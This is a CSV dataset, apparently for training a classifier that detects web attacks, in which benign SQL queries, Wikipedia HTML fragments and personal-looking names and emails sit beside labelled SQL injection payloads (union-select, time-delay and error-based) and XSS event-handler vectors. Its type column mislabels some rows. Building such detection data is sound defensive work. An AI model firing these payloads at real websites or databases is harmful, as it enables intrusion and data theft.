Text,Label,type
"1%'   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   '%'  =  '",1,sql
SELECT AVG ( copy ) FROM slip SELECT SUM ( valley ) ,0,sql
baides,0,sql
"	 </span> <span class=""toctext"">Embodied intelligence ",0,xss
"<element onmouseleave=""alert(1)"">test</element>",2,xss
75512816k,0,sql
"1""   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,sql
1'   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'njge' like 'njge,1,sql
"-3626%""  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""%""  =  """,1,sql
"1"" union all select null,null,null--",1,sql
ip50,0,sql
SELECT * FROM newspaper FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
<html onpointerenter=alert(1)>XSS</html>,2,xss
"c/ la paloma, 32 12-a",0,sql
"<li class=""toclevel-2 tocsection-21""><a href=""#Sub-symbolic""><span class=""tocnumber"">5.3 ",0,xss
"  SELECT slightID AS ID, angle AS daughter FROM saved",0,sql
SELECT * FROM manufacturing WHERE wooden NOT LIKE '[difference]%',0,sql
<header id=x tabindex=1 onactivate=alert(1)></header>,2,xss
"<colgroup draggable=""true"" ondragstart=""alert(1)"">test</colgroup>",2,xss
"<td onkeyup=""alert(1)"" contenteditable>test</td>",2,xss
	 </span> </li>,0,xss
<tr onpointerleave=alert(1)>XSS</tr>,2,xss
" SELECT * FROM happy ORDER BY power, promised",0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
<thead onfocusout=alert(1) tabindex=1 id=x></thead><input autofocus>,2,xss
"1""  )   as rbgl where 3822  =  3822 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1,xss
1'  )   where 9175  =  9175,1,xss
SELECT water,0,sql
<sup onpointerover=alert(1)>XSS</sup>,2,xss
alegra-dulantzi,0,sql
"1%""   )    )     )   union all select null,null,null,null,null,null,null,null,null#",1,sql
SELECT * FROM son WHERE leaf = 'open',0,sql
SELECT * FROM foot FETCH FIRST 3 ROWS ONLY,0,sql
"<shadow onmouseenter=""alert(1)"">test</shadow>",2,xss
"1""  )   as ztkr where 1532  =  1532",1,sql
"<th onmousemove=""alert(1)"">test</th>",2,xss
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Computer systems<br />organization </th><td class=""navbox-list navbox-even"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
SELECT water ( s )  FROM conversation UNION ALL,0,sql
5a09la,0,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 9053 )  ORDER BY meta_id ASC",0,sql
1'||  (  select 'qdkb' where 4331  =  4331,1,sql
"  UPDATE location SET couple =  'line', City =  'key' WHERE belt =  village",0,xss
"<xmp onmouseenter=""alert(1)"">test</xmp>",2,xss
"=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029",2,xss
"INSERT INTO method ( nice, talk, meet, thought, scientific, just )  VALUES  ( 'curious', 'victory'. principle', 'finish', 'independent', 'built', 'married' )  ",0,sql
"<li><cite id=""CITEREFMarkoff2011"" class=""citation news"">Markoff, John (16 February 2011). <a rel=""nofollow"" class=""external text"" href=""https://www.nytimes.com/2011/02/17/science/17jeopardy-watson.html"">""Computer Wins on 'Jeopardy!': Trivial, It's Not"" </a>. <i>The New York Times </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">25 October ",0,xss
"1'+  (  select 'plcm' where 2141  =  2141 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,sql
99999464h,0,sql
6.9084E+15,0,sql
SELECT * FROM cutting WHERE room  BETWEEN 10 AND 20,0,sql
pablo,0,sql
brana@housemovie.id,0,sql
<dir onpointerenter=alert(1)>XSS</dir>,2,xss
5.24225E+13,0,sql
"<style>:target {color: red;}</style><strike id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></strike>",2,xss
SELECT AVG ( Price ) FROM respect,0,xss
<svg><wbr onload=alert(1)></wbr>,2,xss
-4518 where 8023  =  8023 or 6872  =  6872--,1,sql
" select * from users where id  =  1 +1<@ union select version  (    )  ,version  (    )   -- 1",1,sql
SELECT TOP 3 * FROM wrong WHERE bar = 'afraid',0,sql
SELECT * FROM attached WHERE story LIKE '%signal%',0,xss
SELECT Count ( * )  AS greatly,0,sql
SELECT * FROM  ( SELECT plant FROM breakfast ) ,0,sql
"1%""  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""%""  =  """,1,sql
SELECT * FROM master  WHERE space = graph,0,xss
70136564l,0,sql
"<li class=""toclevel-3 tocsection-18""><a href=""#Logic-based""><span class=""tocnumber"">5.2.2 ",0,xss
"<li><a href=""/wiki/Commonsense_knowledge_(artificial_intelligence)"" title=""Commonsense knowledge (artificial intelligence)"">Commonsense knowledge </a> </li>",0,xss
1998,0,sql
"1'  )   as xagu where 9088  =  9088   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",1,xss
"<iframe draggable=""true"" ondragstart=""alert(1)"">test</iframe>",2,xss
<track onpointerleave=alert(1)>XSS</track>,2,xss
SELECT MIN ( wish )  AS wolf FROM ear,0,xss
"1""  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --",1,sql
"<li id=""cite_note-Ontology-98""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Ontology_98-0"">^ </a> </b> ",0,xss
"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf",1,sql
9.84215E+15,0,sql
SELECT * FROM curve 3 SELECT * FROM water,0,sql
SELECT SIGN ( 255.5 ) ;,0,sql
SELECT * FROM deal ORDER BY adventure,0,xss
l-9rn,0,xss
"1  )   union all select null,null,null,null,null,null,null,null,null#",1,sql
kouhi,0,sql
" SELECT column_name ( s )  FROM connected,purple",0,sql
	 </span></p>,0,xss
1'||  (  select 'jmao' where 3009  =  3009,1,xss
<img id=x tabindex=1 ondeactivate=alert(1)></img><input id=y autofocus>,2,xss
"<style>:target {color:red;}</style><canvas id=x style=""transition:color 1s"" ontransitionend=alert(1)></canvas>",2,xss
"<li class=""toclevel-1 tocsection-2""><a href=""#Definitions""><span class=""tocnumber"">2 ",0,xss
lemieux4,0,sql
1'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   'ltki'  =  'ltki,1,xss
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  ""mubt""  =  ""mubt",1,sql
SELECT * FROM  ( SELECT start FROM cowboy ) ,0,sql
13g0e7at42a,0,sql
perih1lio,0,sql
beckwith,0,sql
SELECT * FROM clay WHERE shallow IN  ( SELECT enough FROM flag ) ,0,sql
37110,0,sql
rosi10,0,sql
<head onpointermove=alert(1)>XSS</head>,2,xss
SELECT * FROM chest 3 SELECT * FROM definition,0,xss
"<h2><span class=""mw-headline"" id=""History"">History ",0,xss
DELETE FROM half,0,sql
gussack.reinecke@eddydaniele.pt,0,sql
SELECT COUNT ( bee ) FROM palace,0,xss
goman@fbi-criminal-network.com.mh,0,sql
"1%"" and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""%""  =  """,1,sql
SELECT * FROM Customers  WHERE CustomerName LIKE '%a';,0,xss
	 </span></a></dt><dd>Write the rules to crawl your websites.</dd>,0,xss
"1   )    )     (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (   3366  =  3366",1,sql
" select * from users where id  =  1 or ""?;"" or 1  =  1 -- 1",1,sql
SELECT * FROM yes WHERE certainly IN  ( SELECT heard FROM track ) ,0,sql
SELECT orbit ( s )  FROM east LEFT JOIN,0,sql
SELECT tightly,0,sql
c/ cofa 39,0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
SELECT * FROM title WHERE tired = 'luck' FETCH FIRST 3 ROWS ONLY,0,sql
"<meta name=""ResourceLoaderDynamicStyles"" content=""""/>",0,xss
mohedano tinoco,0,sql
"INSERT INTO respect  ( say, officer, on )  VALUES  ( 'ruler', 'party', 'gradually' )  ",0,sql
"1'   )    )    as usrk where 6324  =  6324 union all select null,null,null,null,null,null,null,null,null,null--",1,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
"<li><a href=""/wiki/Mobile_translation"" title=""Mobile translation"">Mobile translation </a> </li>",0,xss
"<source onkeypress=""alert(1)"" contenteditable>test</source>",2,xss
DELETE FROM drew WHERE change = 'determine',0,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
"<link onbeforepaste=""alert(1)"" contenteditable>test</link>",2,xss
"<li id=""cite_note-306""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-306"">^ </a> </b> ",0,xss
"<dd>""Every aspect of learning or any other feature of intelligence can be so precisely described that a machine can be made to simulate it."" This conjecture was printed in the proposal for the Dartmouth Conference of 1956.<sup id=""cite_ref-Dartmouth_proposal_352-0"" class=""reference""><a href=""#cite_note-Dartmouth_proposal-352"">&#91;341&#93; </a> </sup> </dd> </dl>",0,xss
SELECT * FROM floating WHERE floating = 'himself' FETCH FIRST 3 ROWS ONLY,0,sql
<rt id=x tabindex=1 onbeforedeactivate=alert(1)></rt><input autofocus>,2,xss
cybolski.doumanian@cortinasartesol.bh,0,sql
sprouse,0,sql
"1   )    )     )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
 </li>,0,xss
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   ",1,sql
3.12801E+15,0,sql
"1%"" or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sql
SELECT TOP 3 * FROM plenty,0,sql
17889538t,0,xss
"  SELECT * FROM planning WHERE loud IN  ( 'under', 'way', 'imagine' )  ",0,sql
SELECT * FROM congress WHERE dirty = 'forward' LIMIT 3,0,sql
"<style>@keyframes slidein {}</style><wbr style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></wbr>",2,xss
alysia,0,sql
"1'+  (  select 'vfkl' where 1713  =  1713 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   +'",1,xss
6.20415E+15,0,sql
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=50"" title=""Edit section: Potential harm"">edit </a><span class=""mw-editsection-bracket"">] ",0,xss
ajmet,0,xss
SELECT paint ( s )  FROM saddle SELECT full ( s ) ,0,sql
<textarea oncut=alert(1) autofocus>XSS</textarea>,2,xss
SELECT * FROM  ( SELECT natural FROM run ) ,0,sql
1'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,sql
"1""   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sql
"document.querySelector("""")",2,xss
yecla,0,xss
keung,0,sql
"SELECT * FROM baseball WHERE elephant BETWEEN ""suppose"" AND    ""gas""",0,sql
SELECT AVG ( Price ) FROM him,0,xss
" SELECT * FROM memory ORDER BY care, mathematics",0,sql
lima9za,0,sql
"-9054""  )   as rgyu where 3792  =  3792 order by 1--",1,sql
"<style>:target {color: red;}</style><nav id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></nav>",2,xss
<shadow onblur=alert(1) tabindex=1 id=x></shadow><input autofocus>,2,xss
SELECT * FROM certain WHERE trouble = 'thou',0,sql
benegiles,0,sql
"-5572""  )   union all select 8131,8131#",1,xss
<set onpointermove=alert(1)>XSS</set>,2,xss
" select * from users where id  =  1.<@. union select 1,version  (    )   -- 1",1,xss
"<a href=""/wiki/Intractably"" class=""mw-redirect"" title=""Intractably"">Intractability and efficiency </a> and the <a href=""/wiki/Combinatorial_explosion"" title=""Combinatorial explosion"">combinatorial explosion </a>:",0,xss
3690,0,sql
"<style>@keyframes x{}</style><strong style=""animation-name:x"" onanimationend=""alert(1)""></strong>",2,xss
SELECT * FROM pocket WHERE railroad LIKE '%lungs%',0,sql
<option onpointerdown=alert(1)>XSS</option>,2,xss
otorgamiento,0,sql
SELECT TOP 3 * FROM something SELECT * FROM empty 3SELECT * FROM local,0,sql
70679983v,0,sql
SELECT * FROM frozen WHERE grain = 'car'  AND  ( joined = 'wherever' OR month = 'sight' ) ,0,sql
"1""   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,xss
"<ruby oncontextmenu=""alert(1)"">test</ruby>",2,xss
<u id=x tabindex=1 ondeactivate=alert(1)></u><input id=y autofocus>,2,xss
1'+  (  select 'cwta' where 6091  =  6091,1,sql
1'  )   where 6624  =  6624 and 5392  =  8258,1,sql
"-6200' where 9150  =  9150 union all select 9150,9150,9150,9150,9150,9150,9150#",1,xss
SELECT COUNT ( DISTINCT pine )  FROM beauty,0,sql
"<style>:target {color: red;}</style><p id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></p>",2,xss
	 </span> 2018 ,0,xss
"<li><a href=""#CITEREFNilsson1998"">Nilsson 1998 </a>, ~18.3.3 </li> </ul>",0,xss
SELECT ready ( s )  FROM tight LEFT JOIN,0,sql
"<li><a href=""/wiki/Glossary_of_ecology"" title=""Glossary of ecology"">Ecology </a> </li>",0,xss
"<map draggable=""true"" ondragend=""alert(1)"">test</map>",2,xss
"admin""  )   or   (  ""1""  =  ""1""--",1,sql
15873,0,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'opyt'  =  'opyt",1,sql
SELECT MIN ( height )  AS lost FROM fair,0,sql
"	 </span> <span class=""reference-text""><cite class=""citation web"">Pham, Sherisse (24 April 2017). <a rel=""nofollow"" class=""external text"" href=""https://money.cnn.com/2017/04/24/technology/alibaba-jack-ma-30-years-pain-robot-ceo/index.html"">""Jack Ma: In 30 years, the best CEO could be a robot"" </a>. <i>CNNMoney </i>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=CNNMoney&amp;rft.atitle=Jack+Ma%3A+In+30+years%2C+the+best+CEO+could+be+a+robot&amp;rft.date=2017-04-24&amp;rft.aulast=Pham&amp;rft.aufirst=Sherisse&amp;rft_id=https%3A%2F%2Fmoney.cnn.com%2F2017%2F04%2F24%2Ftechnology%2Falibaba-jack-ma-30-years-pain-robot-ceo%2Findex.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"	 </span> <span class=""reference-text""><cite class=""citation arxiv"">Gillick, Dan; Brunk, Cliff; Vinyals, Oriol; Subramanya, Amarnag (2015). ""Multilingual Language Processing From Bytes"". <a href=""/wiki/ArXiv"" title=""ArXiv"">arXiv </a>:<span class=""cs1-lock-free"" title=""Freely accessible""><a rel=""nofollow"" class=""external text"" href=""//arxiv.org/abs/1512.00103"">1512.00103 </a> ",0,xss
veracruz,0,sql
SELECT COUNT ( climate )  FROM attack,0,sql
shupe,0,sql
"calle catedratico eugenio ubeda romero, s/n,",0,sql
"<small oncut=""alert(1)"" contenteditable>test</small>",2,xss
<input4 onpointerdown=alert(1)>XSS</input4>,2,xss
celadas,0,sql
SELECT TOP 50 PERCENT * FROM thy,0,sql
"<optgroup onmousedown=""alert(1)"">test</optgroup>",2,xss
2759,0,sql
"<li id=""cite_note-276""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-276"">^ </a> </b> ",0,xss
nandor,0,xss
SELECT * FROM balloon  WHERE roll = supper,0,sql
"select sleep  (  5  )   and    (    (     (  ""%""  =  """,1,xss
1'||  (  select 'zeet' from dual where 9567  =  9567 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,xss
<rtc id=x tabindex=1 onbeforeactivate=alert(1)></rtc>,2,xss
31243,0,sql
SELECT DISTINCT plan FROM afternoon,0,sql
"<object draggable=""true"" ondragleave=""alert(1)"">test</object>",2,xss
"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;916–932 </li> </ul>",0,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
admin' or '1'  =  '1,1,sql
SELECT * FROM pair WHERE identity NOT LIKE '[chain]%',0,sql
